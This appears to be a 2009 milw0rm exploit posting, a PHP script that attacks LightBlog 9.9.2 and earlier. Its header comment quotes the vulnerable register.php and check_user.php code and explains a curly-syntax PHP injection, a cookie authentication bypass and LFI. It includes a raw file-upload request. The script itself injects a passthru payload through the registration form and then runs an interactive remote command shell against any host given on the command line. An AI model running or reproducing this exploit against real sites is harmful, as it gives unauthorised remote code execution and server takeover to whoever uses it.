<html><head><title>LightBlog <= 9.9.2 (register.php) Remote Code Execution Exploit</title></head><pre>&lt;?

/*
	---------------------------------------------------------------
	LightBlog &lt;= 9.9.2 (register.php) Remote Code Execution Exploit
	---------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.publicwarehouse.co.uk/
	demo.....: http://www.bailey-projects.com/projects/1/lightblog/

	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.

	[-] vulnerable code in /register.php

	58.	    $username_towrite = stripslashes(htmlspecialchars($_POST['username_post'], ENT_QUOTES));
	59.	    $password_towrite = stripslashes(md5(htmlspecialchars($_POST['pwd1_post'], ENT_QUOTES)));
	60.	    $name_towrite = stripslashes(htmlspecialchars($_POST['name_post'], ENT_QUOTES));
	61.	    $email_towrite = stripslashes(htmlspecialchars($_POST['email_post'], ENT_QUOTES));
	62.	
	63.	    $newaccountfile = &quot;./accounts/{$username_towrite}.php&quot;;
	64.	                         
	65.	    $details = &quot;&lt;?php
	66.	                \$password = \&quot;{$password_towrite}\&quot;;
	67.	                \$name = \&quot;{$name_towrite}\&quot;;
	68.	                \$email = \&quot;{$email_towrite}\&quot;;
	69.	                \$type = \&quot;member\&quot;;
	70.	                \$location = \&quot;\&quot;;
	71.	                \$aboutme = \&quot;\&quot;;
	72.	                \$website = \&quot;\&quot;;
	73.	                ?&gt;&quot;;
	74.	
	75.	    $fd = fopen ($newaccountfile, &quot;w&quot;);
	76.	    chmod($newaccountfile, 0777);
	77.	    fwrite ($fd, $details);
	78.	    fclose($fd);

	An attacker could be able to inject and execute arbitrary PHP code due to new accounts are saved
	with &quot;php&quot; extension. This is possible because input is not properly sanitised, so you can use
	&quot;complex curly syntax&quot;, which allows to put complex expressions into string definitions.

	[-] vulnerable code in /check_user.php

	6.	if(isset($_COOKIE['Lightblog_username']) and isset($_COOKIE['Lightblog_password'])){
	7.	
	8.	    $username_cookie = $_COOKIE['Lightblog_username'];
	9.	    $password_cookie = $_COOKIE['Lightblog_password'];
	10.	
	11.	    if(file_exists(&quot;./accounts/{$username_cookie}.php&quot;)){
	12.	
	13.	        include(&quot;./accounts/{$username_cookie}.php&quot;);
	14.	
	15.	        if($password_cookie != $password){
	16.	            
	17.	            setcookie(&quot;Lightblog_password&quot;, &quot;&quot;, time()-9999999);
	18.	            setcookie(&quot;Lightblog_username&quot;, &quot;&quot;, time()-9999999);
	19.	            echo &quot;&lt;script&gt;location.replace('login.php')&lt;/script&gt;&quot;;
	20.	            exit; 
	21.	
	22.	        } else { 
	23.	            $username = $username_cookie;
	24.	            $user = true; 
	25.	        }

	In addition to the LFI (line 13), an attacker could be able to bypass the authentication by
	setting special crafted cookies. So anyone can access to cp_*.php and is able to to upload
	arbitrary file or put malicious php code into e.g. settings.php. Arbitrary file upload poc:

	POST /lightblog/cp_preview.php HTTP/1.0
	Host: localhost
	Cookie: Lightblog_password=; Lightblog_username=../header
	Content-Length: 166
	Content-Type: multipart/form-data; boundary=o0oOo0o
	Connection: close

	--o0oOo0o
	Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;poc.php&quot;

	&lt;?php evil_code(); ?&gt;
	--o0oOo0o--


	[-] Disclosure timeline:
		
	[21/04/2009] - Bug discovered
	[22/04/2009] - Vendor contacted but no response
	[25/04/2009] - Vendor contacted again still no response
	[26/04/2009] - Vendor has deleted any reference to LighBlog on his site (???)
	[27/04/2009] - Public disclosure

*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
	  die(&quot;\nsocket_create(): &quot; . socket_strerror($s) . &quot;\n&quot;);

	if (socket_connect($s, $host, 80) == false)
	  die(&quot;\nsocket_connect(): &quot; . socket_strerror(socket_last_error()) . &quot;\n&quot;);

	socket_write($s, $packet, strlen($packet));
	while ($m = socket_read($s, 2048)) $response .= $m;

	socket_close($s);
	return $response;
}

print &quot;\n+-------------------------------------------------------------------------+&quot;;
print &quot;\n| LightBlog &lt;= 9.9.2 (register.php) Remote Code Execution Exploit by EgiX |&quot;;
print &quot;\n+-------------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /lightblog/\n\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

$code = rawurlencode('{${error_reporting(0)}}{${print(_code_)}}{${passthru(base64_decode($_SERVER[HTTP_CMD]))}}{${die}}');

$payload = &quot;username_post=test&amp;pwd1_post=test&amp;pwd2_post=test&amp;name_post=test&amp;email_post={$code}&quot;;
$packet  = &quot;POST {$path}register.php HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
$packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;
$packet .= $payload;

http_send($host, $packet);

$packet  = &quot;GET {$path} HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cookie: Lightblog_password=; Lightblog_username=test\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while(1)
{
	print &quot;\nlightblog-shell# &quot;;
	if (($cmd = trim(fgets(STDIN))) == &quot;exit&quot;) break;
	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
	preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed\n&quot;);
}

?&gt;

# milw0rm.com [2009-04-27]</pre></html>